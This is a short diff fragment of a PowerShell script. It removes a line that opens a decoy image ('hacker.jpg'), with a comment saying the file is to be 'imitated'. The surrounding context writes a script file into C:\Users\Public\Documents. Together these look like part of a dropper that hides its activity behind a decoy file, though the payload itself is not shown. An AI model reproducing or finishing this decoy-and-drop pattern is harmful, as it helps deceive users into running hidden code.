@@ -184,7 +184,6 @@ $Script = @'
     }
     Stop-Process -ID $PID
 '@
-Start-Process hacker.jpg #this needs to be changed to a existing file to be imitated
 
 Remove-Item -Path "C:\Users\Public\Documents\test.ps1" -Force
 New-Item -Path "C:\Users\Public\Documents\test.ps1" -ItemType "file" -Value $Script
